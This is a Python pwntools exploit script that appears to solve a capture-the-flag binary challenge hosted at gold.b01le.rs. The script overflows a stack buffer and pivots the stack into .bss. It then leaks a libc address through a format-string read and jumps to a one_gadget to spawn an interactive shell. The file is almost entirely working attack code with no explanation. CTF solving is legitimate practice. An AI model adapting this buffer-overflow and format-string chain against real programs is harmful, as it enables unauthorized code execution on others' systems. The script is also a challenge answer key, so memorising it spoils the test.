#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chal_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc gold.b01le.rs 4008"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
io = start()

new_stack = elf.bss(0xc00)

leave_ret = 0x004012f7
pop_rbp = 0x0040139c

payload = flat(
    b"A" * 0x40,
    new_stack,
    elf.sym["main"] + 38,
    1,
    elf.sym["_start"]
)
io.sendlineafter(b"be?! \n", payload)

payload = f"%3$p\n".encode()
io.sendafter(b"song? ", payload)
io.recvuntil(b"h! ")
libc_leak = int(io.recvline(), 16)
libc.address = libc_leak - 0x114887
log.info(f"{libc.address=:#x}")

one_gadget = libc.address + 0xebc81

payload = flat(
    b"A" * 0x40,
    new_stack,
    one_gadget,
)

io.sendlineafter(b"be?! \n", payload)

io.interactive()
